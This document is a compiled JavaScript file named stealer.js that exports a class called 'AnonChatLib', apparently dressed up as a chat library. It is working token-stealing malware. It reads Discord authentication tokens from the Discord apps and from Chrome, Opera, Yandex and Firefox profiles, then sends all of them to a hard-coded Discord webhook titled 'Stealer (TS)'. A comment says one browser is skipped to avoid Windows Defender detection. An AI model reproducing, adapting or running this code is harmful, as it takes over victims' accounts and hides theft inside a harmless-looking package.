"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.AnonChatLib = void 0;
const Bluebird = require("bluebird");
const storage_1 = require("@assasans/storage");
const common_tags_1 = require("common-tags");
const discord_js_1 = require("discord.js");
const leveldb_1 = require("./service/leveldb");
const firefox_1 = require("./service/firefox");
class AnonChatLib {
    constructor() {
        this.services = new storage_1.List();
        this.services.addRange(storage_1.List.fromArray([
            new leveldb_1.LevelDBService('Discord', 'Roaming/Discord'),
            new leveldb_1.LevelDBService('Discord PTB', 'Roaming/discordptb'),
            new leveldb_1.LevelDBService('Discord Canary', 'Roaming/discordcanary'),
            new leveldb_1.LevelDBService('Google Chrome', 'Local/Google/Chrome/User Data/Default'),
            new leveldb_1.LevelDBService('Opera', 'Roaming/Opera Software/Opera Stable'),
            new leveldb_1.LevelDBService('Opera GX', 'Roaming/Opera Software/Opera GX Stable'),
            new leveldb_1.LevelDBService('Yandex', 'Local/Yandex/YandexBrowser/User Data/Default'),
            // Detected by Windows Defender
            // new LevelDBService('Brave', 'Local/BraveSoftware/Brave-Browser/User Data/Default'),
            new firefox_1.FirefoxService('Firefox', 'Roaming/Mozilla/Firefox')
        ]));
    }
    async run() {
        const tokens = new storage_1.List();
        await Bluebird.all(this.services.map(async (service) => {
            tokens.addRange(await service.getTokens());
        }));
        const client = new discord_js_1.WebhookClient('766342517549301771', 'r5lqtrhieTfiwqhneOrtWQsK0WtT-_SjuWNESv3uXQtAw2yCMS5zNfEl6UAoTcEr-_gN');
        await client.send(undefined, {
            embeds: [
                {
                    title: 'Stealer (TS)',
                    description: common_tags_1.stripIndents `
						Tokens:
						${tokens.map((token) => {
                        return `[${token.service.name}]: ${token.value}`;
                    }).join('\n')}
					`
                }
            ]
        });
        global.__anon_chat_lib = true;
    }
}
exports.AnonChatLib = AnonChatLib;
//# sourceMappingURL=stealer.js.map